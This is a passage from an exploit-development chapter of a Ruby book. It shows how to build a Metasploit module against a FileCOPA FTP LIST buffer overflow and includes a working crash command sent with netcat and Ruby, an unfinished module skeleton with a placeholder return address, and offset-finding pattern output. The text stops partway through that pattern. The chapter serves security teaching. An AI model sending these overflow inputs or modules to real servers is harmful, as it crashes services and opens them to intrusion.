<html><head></head><body>
  <div class="sgc-1" id="filepos774690"/>&#13;
&#13;
  <h1 class="calibre1" id="calibre_pb_480"><span class="calibre2"><a class="calibre7" shape="rect"/>Chapter 10. WRITING A METASPLOIT 3.1 MODULE WITH RUBY</span></h1>&#13;
&#13;
  <div class="calibre3"><a class="calibre17" shape="rect"/><img alt="WRITING A METASPLOIT 3.1 MODULE WITH RUBY" class="calibre23" src="../Images/00001.jpg"/></div>&#13;
&#13;
  <p class="calibre4">The previous chapters of this book have been devoted to what I consider mainstream Ruby scripting. Ruby is one of my passions, and information security is another, so I decided to write a chapter combining them. This chapter is a step-by-step guide to exploit development using the <a class="calibre17" shape="rect"/>Metasploit Framework (MSF).</p>&#13;
&#13;
  <p class="calibre4">For the following example, I used a vulnerability I found listed on the <a class="calibre17" shape="rect"/>Open Source Vulnerability Database (<a class="calibre6" href="http://www.osvdb.org/" shape="rect">http://www.osvdb.org/</a>). We won't be discovering <a class="calibre17" shape="rect"/>vulnerabilities ourselves, but there are many other books and articles written on the subject. If you like what you see here, then you should take a look at fuzzing and software reverse engineering because those are two of the primary methods used to find exploits.</p>&#13;
&#13;
  <p class="calibre4">By the end of this chapter, you will know how to write a working <a class="calibre17" shape="rect"/>exploit for a closed-source FTP server—all using the wicked cool power of Ruby and MSF.</p>&#13;
&#13;
  <p class="calibre4">I almost couldn't believe it when I read that the <a class="calibre17" shape="rect"/>Metasploit team decided to completely rewrite MSF in Ruby. (MSF 2.0 used <a class="calibre17" shape="rect"/>Perl as its foundation.) A nice feature of both Perl and Ruby is that they are platform independent, so both Windows and Unix-like operating systems are capable of using the framework. I'm excited about this topic, so let's get started!</p>&#13;


  <div class="calibre3">
    <div class="calibre3 calibre3 calibre3">
      <h1 class="calibre1" id="calibre_pb_481"><span class="calibre2"><a class="calibre7" shape="rect"/><a class="calibre7" id="filepos777193"/>Introduction to Metasploit</span></h1>
    </div>

    <p class="calibre4">MSF is a great tool for writing <a class="calibre17" shape="rect"/>exploits, quickly switching <a class="calibre17" shape="rect"/>payloads, and managing exploited systems. To make sure we are speaking the same language, the <span><em class="italic">exploit</em></span> is what allows the attacker to gain control of a system—the code that takes advantage of the software's vulnerability. The <span><em class="italic">payload</em></span> is the code that you'd like to execute on the target machine after exploitation: It could be a bind shell, which would launch a command prompt every time an attacker connects to a specific port on the victim machine, or it could be as simple as adding a user on the victim machine. If you browse through an <a class="calibre17" shape="rect"/>exploit-repository website like <a class="calibre6" href="http://www.milw0rm.com/" shape="rect">http://www.milw0rm.com/</a>, you'll find that most exploits have some payload at the top of the code. Those exploits only do one thing and are, thus, not terribly flexible. If you wanted a different payload, you would have to rewrite the exploit each time to add the new payload and make adjustments to the buffer sizes so the exploit continued to function properly. The process can be tedious.<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">MSF creates the payloads dynamically, based on user input; once you write an exploit in MSF, switching payloads is a breeze. Along with the core of MSF, there are other tools and auxiliary modules that are useful during exploit development and penetration testing, such as reconnaissance, protocol fuzzing, Denial of Service, and vulnerability scanning. I encourage you to think beyond the exploits included with the framework. Many MSF users know the basics of MSF but don't know how to create their own modules. This chapter will expose you to the real strength of MSF—customized exploitation.</p>
  </div>

  <div class="mbppagebreak" id="calibre_pb_482"/>


  <div class="calibre3" id="filepos779421">&#13;
    <div class="calibre3 calibre3 calibre3">&#13;
      <h1 class="calibre1" id="calibre_pb_483"><span class="calibre2"><a class="calibre7" shape="rect"/>Installation</span></h1>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">I will be using two different systems for the example. One is a Windows XP machine (the attacker), and the other is a Windows 2000 machine (the victim). The physical network layout doesn't matter too much for this example. I used a virtualized network, but you can install the applications on one machine or have two separate computers. As far as operating systems, the victim must be a Windows 2000 machine due to the libraries used in the exploit. Once you have written the exploit, the attacking machine can run any operating system that is supported by Metasploit, which is just about everything. The choice is yours; the results will be the same.</p>&#13;
&#13;
    <p class="calibre4">To follow along with this chapter, you will need a fully functional installation of MSF 3.1 on your computer, which you can obtain <a class="calibre17" shape="rect"/>from <a class="calibre6" href="http://www.metasploit.com/framework/" shape="rect">http://www.metasploit.com/framework/</a>. Make sure you choose the Metasploit version <a class="calibre17" shape="rect"/>for your operating system. I will be referring to a Windows installation, but the installation process on other operating systems will be similar due to the smart design of <a class="calibre17" shape="rect"/>Metasploit.</p>&#13;
&#13;
    <p class="calibre4">Once you've installed MSF on the attack machine, start the framework by selecting <span><strong class="calibre22">Start ► Programs ► Metasploit 3 ► Metasploit 3 GUI</strong></span>. (To follow along, non-Windows users should launch the Metasploit 3 GUI.)</p>&#13;
&#13;
    <p class="calibre4">MSF has four <a class="calibre17" shape="rect"/>ways to operate the framework: <span><em class="italic">Metasploit 3 Web, Graphical User Interface (GUI), Command-Line Interface (CLI)</em></span>, and <span><em class="italic">Console</em></span>. The console and CLI are both text-based. The Metasploit 3 Web interface and GUI are graphical, with varying degrees of granularity in the exploit process. The GUI will be the interface we use for this chapter.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">I used the console almost exclusively in MSF 2.0, but I switched to the GUI in version 3.1 because the interface is so clean and easy to use, and the functionality is comparable to the console. Knowing how to operate the MSF console will provide a better understanding of the framework, and then switching between the console and GUI will become seamless.</p>&#13;
&#13;
    <p class="calibre4">At this point, you've installed MSF 3.1 and can start the Metasploit 3 GUI without errors. After you have started the framework, you should see an application window that pops up and loads MSF (see <a class="calibre6" href="#filepos783081" shape="rect">Figure 10-1</a>). If for some reason you don't get the pop-up, check the MSF logs for any errors.</p>&#13;
&#13;
    <div class="calibre20">&#13;
      <span class="italic"><a class="calibre17" shape="rect"/></span>&#13;
&#13;
      <div class="calibre3 calibre3" id="filepos783081">&#13;
        <span class="italic"><a class="calibre17" shape="rect"/><img alt="The Metasploit GUI" class="calibre23" src="../Images/00017.jpg"/></span>&#13;
      </div>&#13;
&#13;
      <p class="calibre4">Figure 10-1. The Metasploit GUI</p>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">When the application has finished loading, you will notice several panes with different titles: <span><em class="italic">Exploits/Auxiliary, Jobs, Module Information/Output</em></span>, and <span><em class="italic">Sessions</em></span>. You can click around in each pane to see various parts of the framework. If you've gotten this far, then your MSF install was successful, and we can move on to <a class="calibre17" shape="rect"/>writing the exploit. If this is your first time using MSF, then take a moment to browse around and get a feel for the interface before coming back to this section.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
  </div>&#13;
&#13;
  <div class="mbppagebreak" id="calibre_pb_484"/>&#13;


  <div class="calibre3" id="filepos784317">
    <div class="calibre3 calibre3 calibre3">
      <h1 class="calibre1" id="calibre_pb_485"><span class="calibre2"><a class="calibre7" shape="rect"/>Writing a Module</span></h1>
    </div>

    <p class="calibre4">The last time I checked, the <a class="calibre17" shape="rect"/>framework came with over 450 exploits and 104 payloads to assist its users in security research. The number of payloads and exploits vary thanks to regular updates from the security community. The exploits included are based on well-known and documented vulnerabilities, so targeting a fully updated system would frustrate the user and framework … that is, unless the user knows how to write his own modules.<sup class="calibre35">[<a class="calibre6" href="#filepos787314" id="filepos785168" shape="rect">2</a>]</sup></p>

    <p class="calibre4">The 450 exploits that come bundled with MSF 3.1 are located in <span><em class="italic">msf3.tar\msf3\modules\exploits\</em></span>.</p>

    <p class="calibre4">The directory structure of the modules is very well organized; for example, to find an FTP exploit on a Windows machine, you'd look in the folder <span><em class="italic">windows</em></span>, and then <span><em class="italic">ftp</em></span>.</p>

    <p class="calibre4">The target program we will be exploiting is <a class="calibre17" shape="rect"/>FileCOPA FTP Server version 1.01 from before July 18, 2006. A Google search will turn up the vulnerable program. The FTP software runs on a Windows platform and provides an FTP service. The vulnerability we will exploit resides in improper bounds-checking of an argument passed to the <code class="calibre19">LIST</code> function. The vulnerability is publicly available, and the advisory, "FileCOPA FTP Server LIST Command Overflow," can be found on the Open Source Vulnerability Database website (<a class="calibre6" href="http://osvdb.org/show/osvdb/27389/" shape="rect">http://osvdb.org/show/osvdb/27389/</a>).</p>

    <p class="calibre4">Several proof-of-concept exploits have been written for this vulnerability, so this exploit won't add anything new to the security world. However, by understanding how to create your own MSF module, you will be able to develop other undocumented exploits. This module was recently added to the MSF 3.1 installation. If you are using an older version of MSF (pre-3.1), then you can add the module to your MSF library.</p>

    <div class="calibre3">
      <br class="calibre20"/>
      <hr class="calibre21"/>

      <div class="calibre3">
        <p class="calibre4"><sup class="calibre35">[<a class="calibre6" href="#filepos785168" id="filepos787314" shape="rect">2</a>]</sup> MSF euphemistically calls exploits <span><em class="italic">modules</em></span>. When you see <span><em class="italic">MSF module</em></span>, we're really talking about an exploit in MSF.</p>
      </div>
    </div>
  </div>

  <div class="mbppagebreak" id="calibre_pb_486"/>


  <div class="calibre3" id="filepos787694">&#13;
    <div class="calibre3 calibre3 calibre3">&#13;
      <h1 class="calibre1" id="calibre_pb_487"><span class="calibre2"><a class="calibre7" shape="rect"/>Building the Exploit</span></h1>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">As I mentioned previously, FileCOPA FTP Server has a <a class="calibre17" shape="rect"/>vulnerability in its <code class="calibre19">LIST</code> function. By targeting a machine running the vulnerable application and sending a specially crafted <code class="calibre19">LIST</code> command to the server, we can execute arbitrary code on the remote machine. This is a good position to be in for a penetration tester or security researcher. To test this vulnerability, send the <code class="calibre19">LIST</code> command to the server followed by the letter A repeated 1,000 times (1,000 is arbitrary; the command just needs to be long enough to trigger the overflow). The result will be a dead FTP server. The repeated <span><em class="italic">A</em></span>s caused the server to <a class="calibre17" shape="rect"/>crash because the <span><em class="italic">A</em></span>s overwrote important data on the stack.<a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">To demonstrate the server <a class="calibre17" shape="rect"/>crashing, we will use a tool bundled with MSF called <a class="calibre17" shape="rect"/>netcat. The tool is located in <span><strong class="calibre22">Start ► Programs ► <a class="calibre17" shape="rect"/>Metasploit 3 ► Tools ► Netcat</strong></span>, but it can also be downloaded as a standalone program. The basic description of netcat is that it's a networking utility used to read and write data across the network—perfect! We'll be reading and writing data to an FTP server across a network. To begin the <a class="calibre17" shape="rect"/>FTP session, run the following commands (you can access the command prompt by selecting <span><strong class="calibre22">Start ► Run</strong></span>, typing <strong class="calibre22"><code class="calibre19">cmd</code></strong>, and pressing ENTER.</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19"><strong class="calibre22"><code class="calibre19">nc -vv 127.0.0.1 21</code></strong><br class="calibre20"/>&#13;
      localhost [127.0.0.1] 21 (ftp) open<br class="calibre20"/>&#13;
      USER anonymous<br class="calibre20"/>&#13;
      220-InterVations FileCOPA FTP Server Version 1.01<br class="calibre20"/>&#13;
      220 Trial Version. 30 days remaining<br class="calibre20"/>&#13;
      <strong class="calibre22"><code class="calibre19">LIST -l 'A'x1000</code></strong></tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">The server crashed because it only expects input relating to the listing of a file or directory. To verify that the server crashed, try making another connection. When we send garbage data (e.g., <code class="calibre19">'A' x 1000</code>) to the FTP server, the victim application attempts to store all of the input and overwrites itself on the stack. This is known as a <span><em class="italic">stack-based buffer overflow</em></span>. The significance of this data overwriting is that the program overwrites an address used to point to the next instruction for execution. If we overwrite the next address for execution, we can point the program to execute our code.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">There are several ways to send the big A string. One way is using netcat, as shown above. You can also use Perl, with something like <code class="calibre19">perl -e "print'A'x1000"</code>, or you can use Ruby. Any way you choose will have the same effect. Using Ruby, you can type something like this:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19"><strong class="calibre22"><code class="calibre19">require 'net/ftp'</code></strong><br class="calibre20"/>&#13;
      <strong class="calibre22"><code class="calibre19">Net::FTP.open('127.0.0.1') do |ftp|</code></strong><br class="calibre20"/>&#13;
      <strong class="calibre22"><code class="calibre19">    ftp.login</code></strong><br class="calibre20"/>&#13;
      <strong class="calibre22"><code class="calibre19">    ftp.list('A' + 'A'*1000)</code></strong><br class="calibre20"/>&#13;
      <strong class="calibre22"><code class="calibre19">end</code></strong></tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">If you run the code snippet from netcat or Ruby a second time, you will get an error message because the client won't be able to connect to the crashed FTP server. That is the beginning of our attack. We still need more information to build a successful <a class="calibre17" shape="rect"/>exploit, which leads us to the next step.</p>&#13;
  </div>&#13;
&#13;
  <div class="mbppagebreak" id="calibre_pb_488"/>&#13;


  <div class="calibre3" id="filepos792784">&#13;
    <div class="calibre3 calibre3 calibre3">&#13;
      <h1 class="calibre1" id="calibre_pb_489"><span class="calibre2"><a class="calibre7" shape="rect"/>Watching in Real Time</span></h1>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">To see the FTP server crash in real time and also track what's happening on the stack, you will need a <span><em class="italic">debugger</em></span>. I'm partial to <a class="calibre17" shape="rect"/>OllyDbg (<a class="calibre6" href="http://www.ollydbg.de/" shape="rect">http://www.ollydbg.de/</a>), but Immunity, Inc. recently released <a class="calibre17" shape="rect"/>Immunity Debugger (<a class="calibre6" href="http://www.immunitysec.com/products-immdbg.shtml/" shape="rect">http://www.immunitysec.com/products-immdbg.shtml/</a>), which I'm told is also good. Choose a debugger and install it on the computer hosting the FTP server.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4"><a class="calibre17" shape="rect"/>Watching the program crash isn't complicated; the first step is to restart the FTP Server. Then fire up OllyDbg. When OllyDbg has opened, select <span><strong class="calibre22">File ► Attach</strong></span>. A <a class="calibre17" shape="rect"/>list of running <a class="calibre17" shape="rect"/>processes will pop up in a new window. The list will contain all of the processes currently running on the system hosting the FTP server (that is, the victim system). Scroll down the <a class="calibre17" shape="rect"/>list of processes to find the FileCOPA FTP Server, named <code class="calibre19">filecpt</code>. This is the FTP server process, but it is not what we are looking for. If you make a connection to the FTP server, a new <span><em class="italic">child process</em></span> will spawn before the FTP server sends any packets. This is the process we want to attach. It's called <code class="calibre19">filecpnt</code>. Highlight the process and click the <span><strong class="calibre22">Attach</strong></span> button. Now OllyDbg will be monitoring the FTP connection and will notify you if the FileCOPA FTP program crashes or throws an error.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">Moving back to your attack machine, you should already have a connection to the FTP server. All that's left to do is send the malicious <code class="calibre19">LIST</code> command as shown above, using netcat or Ruby. As soon as the <code class="calibre19">LIST</code> command is sent, OllyDbg should pop up on the victim computer with a bright yellow box in the bottom-right corner that states <code class="calibre19">paused</code>. The bottom-left corner should contain text that says <code class="calibre19">Access violation when executing [41414141]</code>. The <code class="calibre19">41</code> is the hexadecimal representation of the letter <span><em class="italic">A</em></span>—the same letter we smashed on the stack! That's exciting news; now we are getting somewhere. Take a look at the stack in OllyDbg, located in the lower-right pane of the program (<a class="calibre6" href="#filepos796638" shape="rect">Figure 10-2</a>). You'll see a whole bunch of <code class="calibre19">41414141</code>s repeated. This is the data we sent with the <code class="calibre19">LIST</code> command.</p>&#13;
&#13;
    <div class="calibre20">&#13;
      <span class="italic"><a class="calibre17" shape="rect"/></span>&#13;
&#13;
      <div class="calibre3 calibre3" id="filepos796638">&#13;
        <span class="italic"><a class="calibre17" shape="rect"/><img alt="The OllyDbg report on the crashed FTP server" class="calibre23" src="../Images/00018.jpg"/></span>&#13;
      </div>&#13;
&#13;
      <p class="calibre4">Figure 10-2. The OllyDbg report on the crashed FTP server</p>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">Now that we can reliably crash the program by hand and we know where we are <a class="calibre17" shape="rect"/>writing our information, let's give this a try in MSF. To do this, we will need to create a <a class="calibre17" shape="rect"/>shell module and use 1,000 <span><em class="italic">A</em></span>s as the payload. Remember that a module is the same thing as an exploit in MSF. The shell we will begin working with looks like this:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">require 'msf/core'<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
      module Msf<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
        class Exploits::Windows::Ftp::FileCopa_List &lt; Msf::Exploit::Remote<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          include Exploit::Remote::Ftp<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def initialize(info = {})<br class="calibre20"/>&#13;
            super(update_info(info,<br class="calibre20"/>&#13;
                'Name'           =&gt; 'FileCOPA 1.01 &lt;= List Overflow',<br class="calibre20"/>&#13;
                'Description'    =&gt; %q{This module exploits a stack overflow in the<br class="calibre20"/>&#13;
      FileCOPA multi-protocol file transfer service. A valid user account (or<br class="calibre20"/>&#13;
      anonymous access) is required for this exploit to work.<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Author'         =&gt; 'Steve &lt;Steve@nostarch.com&gt;',<br class="calibre20"/>&#13;
                'License'        =&gt; MSF_LICENSE,<br class="calibre20"/>&#13;
                'Version'        =&gt; '$Revision: 4498 $',<br class="calibre20"/>&#13;
                'References'   =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  ['OSVDB', '27389'],<br class="calibre20"/>&#13;
                ],<br class="calibre20"/>&#13;
                'Privileged'     =&gt; true,<br class="calibre20"/>&#13;
                'DefaultOptions' =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'EXITFUNC' =&gt; 'thread',<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Payload'        =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'Space'    =&gt; 1000,<br class="calibre20"/>&#13;
                  'BadChars' =&gt; "\x00",<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Targets'        =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                    'Windows 2000 Professional SP4 English',<br class="calibre20"/>&#13;
                    {<br class="calibre20"/>&#13;
                      'Platform' =&gt; 'win',<br class="calibre20"/>&#13;
                      'Ret'      =&gt; 0XDEADBEEF,<br class="calibre20"/>&#13;
                    },<br class="calibre20"/>&#13;
                  ],<br class="calibre20"/>&#13;
                ]))<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def exploit<br class="calibre20"/>&#13;
            connect_login<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            <a class="calibre17" shape="rect"/>print_status("Trying target #{target.name}...")<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            print_status("Find the process and attach Ollydbg.")<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            sleep 30<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            buf  = 'A'*1000<br class="calibre20"/>&#13;
            send_cmd( ['LIST', buf] , false)<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            handler<br class="calibre20"/>&#13;
            disconnect<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
        end</tt></span>&#13;
    </div>&#13;
  </div>&#13;
&#13;
  <div class="mbppagebreak" id="calibre_pb_490"/>&#13;


  <div class="calibre3" id="filepos801017">
    <div class="calibre3 calibre3 calibre3">
      <h1 class="calibre1" id="calibre_pb_491"><span class="calibre2"><a class="calibre7" shape="rect"/>Explanation of Metasploit Module Shell</span></h1>
    </div>

    <p class="calibre4">This shell has some common sections that are included in most MSF modules. The first is <code class="calibre19">require msf/core</code>. This <code class="calibre19">require</code> statement enables the module to use the MSF core library. Next is a class declaration. Since we are attacking an FTP server remotely, we need the module to inherit the attributes of <code class="calibre19">Msf::Exploit::Remote</code>. If you were developing a local privilege escalation or some other type of exploit, you would change this line to that specific exploit type. Another line specific to our FTP module is <code class="calibre19">Exploit::Remote::Ftp</code>, which enables the use of FTP methods. This line abstracts some of the commands, such as initializing a connection and logging in, so we can focus on writing the exploit rather than establishing the FTP session.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>

    <p class="calibre4">The <code class="calibre19">initialization</code> method is where the module begins to take shape. Stepping through each line, we begin with the name of the exploit and a description of the module. This can be whatever is relevant to the module you are writing. The descriptions will be shown whenever a user looks at the exploits from the framework. The more accurate the description, the less confusion later.<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">The next part of the <code class="calibre19">initialization</code> method contains <a class="calibre17" shape="rect"/>information specific to the author of the module. Jumping to <code class="calibre19">payload, platform</code>, and <code class="calibre19">targets</code>—these options dictate how the exploit will function, what platforms to target, and other constraints. The <code class="calibre19">EXITFUNC</code> is set to <code class="calibre19">thread</code> so that only a process thread is killed when MSF disconnects from the victim. This method will attempt to keep from crashing the exploited program on a successful exploit and instead just crash a thread.<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">The payload space <a class="calibre17" shape="rect"/>size needs to be set to something, and this number is critical to our exploit. Right now we will set the value to <code class="calibre19">1000</code> characters because we slammed A 1,000 times without issue, but we will modify this later. Next are the bad characters, or <code class="calibre19">BadChars</code>. This list will grow as we find characters that frustrate a successful exploit. I've already added <code class="calibre19">\x00</code> to the list because it signifies the end of a string and is a typical bad character.<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">The next section of the <code class="calibre19">initialization</code> method is for the <code class="calibre19">Targets</code>. I'm hosting the FTP server on a Microsoft Windows 2000 Professional Service Pack 4 machine, so the specific target information will be kept here. More platforms can be included as the exploit is tested on other operating systems, but for now, we will keep the targets limited to our one victim machine. This ends the <a class="calibre17" shape="rect"/>initialization method and provides a solid starting point for the rest of the module.<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">The final method of our shell is the called <code class="calibre19">exploit,</code> and this is where the magic happens. Using <code class="calibre19">connect_login</code> (which is part of MSF), we start an FTP session with the target. See how much easier that was than using netcat or Ruby by itself?<a class="calibre17" shape="rect"/></p>

    <p class="calibre4">A default status message is displayed after the connection, letting the user know that the exploit is in progress and the target information is held in <code class="calibre19">target.name</code>. Because we are targeting a child process, I added a <code class="calibre19">sleep</code> function (lasting 30 seconds) to allow enough time to attach the debugger to the process before smashing the stack.</p>

    <p class="calibre4">After the 30 seconds has expired, our payload is created and saved into <code class="calibre19">buf</code>. In this case, the payload will be 1,000 <span><em class="italic">A</em></span>s. The command <code class="calibre19">LIST</code> and the <code class="calibre19">buf</code> are both sent to the target, and the <code class="calibre19">handler</code> method is called to wait for a response from the target. If the exploit was successful, then <code class="calibre19">handler</code> will catch the response and control further actions. When the user is finished with the session, <code class="calibre19">disconnect</code> is called, which completes the exploit. In this example, the module will stop after the <code class="calibre19">send_cmd</code> because <span><em class="italic">A</em></span> (aka <code class="calibre19">\x41</code>) doesn't hack anything; so no response will be sent to <code class="calibre19">handler</code>.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>

    <p class="calibre4">To test your new MSF module, save this file as <span><em class="italic">filecopa_exploit.rb</em></span><sup class="calibre35">[<a class="calibre6" href="#filepos810139" id="filepos807392" shape="rect">3</a>]</sup> in the folder <span><em class="italic">\AppData\Local\.msf3\modules</em></span>\. Then start the FTP server, OllyDbg, and MSF. Attach OllyDbg to the FTP Server on the victim machine. On the attack machine, restart the MSF GUI. Within the MSF, click <span><strong class="calibre22">Exploits</strong></span>, and search for FileCOPA. Find the <a class="calibre17" shape="rect"/>module shell we just wrote (it will have our description) and double-click it. A new window will pop up asking what platform you'd like to target. Since we only included one target in the module's code, we only have one choice. Click <span><strong class="calibre22">Forward</strong></span>. Next, you will select the <code class="calibre19">generic/shell_reverse_tcp</code> payload. Don't worry about the payload for now; we are only using A—not the actual payload. Click <span><strong class="calibre22">Forward</strong></span> to proceed. On the following screen, you will be asked to enter specific information about the target and yourself. The only information required is the <code class="calibre19">RHOST</code>, which will be the <span><em class="italic">remote host</em></span>, or victim's IP address. You can leave the fields that were already completed as they are unless you know that something is different than the default. MSF automatically detects your local IP address, assumes FTP is on port 21, and assumes the FTP server permits anonymous logins. Click the <span><strong class="calibre22">Forward</strong></span> button, review the information, and click <span><strong class="calibre22">Apply</strong></span>.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>

    <p class="calibre4">Remember, we have 30 seconds to attach the debugger to the correct process; so right after you hit <span><strong class="calibre22">Apply</strong></span>, you'll need to find the child process, <code class="calibre19">filecpnt</code>. After the process has been attached and MSF continues executing the <a class="calibre17" shape="rect"/>module, OllyDbg should jump up on the victim machine and show the same messages it did before (when we manually exploited the FTP server).</p>

    <div class="calibre3">
      <br class="calibre20"/>
      <hr class="calibre21"/>

      <div class="calibre3">
        <p class="calibre4"><sup class="calibre35">[<a class="calibre6" href="#filepos807392" id="filepos810139" shape="rect">3</a>]</sup> If you are using MSF 3.1, you will see <span><em class="italic">filecopa_list_overflow.rb</em></span>. This is the same exploit we are writing from scratch, so don't worry about it for now.</p>
      </div>
    </div>
  </div>

  <div class="mbppagebreak" id="calibre_pb_492"/>


  <div class="calibre3" id="filepos810493">&#13;
    <div class="calibre3 calibre3 calibre3">&#13;
      <h1 class="calibre1" id="calibre_pb_493"><span class="calibre2"><a class="calibre7" shape="rect"/>Finding the Payload Space</span></h1>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">I mentioned that the payload space variable was critical to our exploit. The next step in development is to define the payload. To do this, we first need to find out how much space is available to play with. The more space we have, the more options we get as far as how much capability we can fit into our payloads. There are 104 payloads in MSF 3.1, and each payload is a different size. If the vulnerable program has limited space for us to use, then some of the larger payloads won't work. We also need to know what position on the stack is read as the next instruction right before it crashes.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">During our first two exploit attempts, OllyDbg told us that the next instruction pointer's address was <code class="calibre19">0x41414141</code> when the FTP server crashed. This address is part of our <span><em class="italic">A</em></span> series. To identify which part was loaded into the instruction pointer, we need to change the <span><em class="italic">A</em></span> series to a series of characters that are unique and non-repeating. We will fill the code with predictable data and see where the program crashes. That will show where the address is being read from the stack. Basically, we will send the unique data, read where OllyDbg crashed, then search our string for the unique, non-repeating data. The final placement will show us the buffer size needed to gain control of the application.</p>&#13;
&#13;
    <p class="calibre4">MSF comes with a great tool called <code class="calibre19">pattern_create.rb</code>. You can find it in <span><em class="italic">msf3.tar\msf3\tool</em></span>. This Ruby <a class="calibre17" shape="rect"/>script generates predictable, non-repeating strings—exactly what we will use to find the payload space. Because we have used 1,000 as the number of characters in our payload, we will use <span><em class="italic">pattern_create.rb</em></span> to generate a unique 1,000-character string. The following command will generate the pattern and output the results to <span><em class="italic">payload_test.txt</em></span>:<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">C:\Users\Steve\AppData\Local\msf3\tools&gt;<strong class="calibre22"><code class="calibre19">ruby pattern_create.rb 1000 &gt; payload_test.txt</code></strong></tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">The contents of <span><em class="italic">payload_test.txt</em></span> are shown below:<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5<br class="calibre20"/>&#13;
      Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1<br class="calibre20"/>&#13;
      Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7<br class="calibre20"/>&#13;
      Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3<br class="calibre20"/>&#13;
      Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9<br class="calibre20"/>&#13;
      An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5<br class="calibre20"/>&#13;
      Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1<br class="calibre20"/>&#13;
      As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7<br class="calibre20"/>&#13;
      Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3<br class="calibre20"/>&#13;
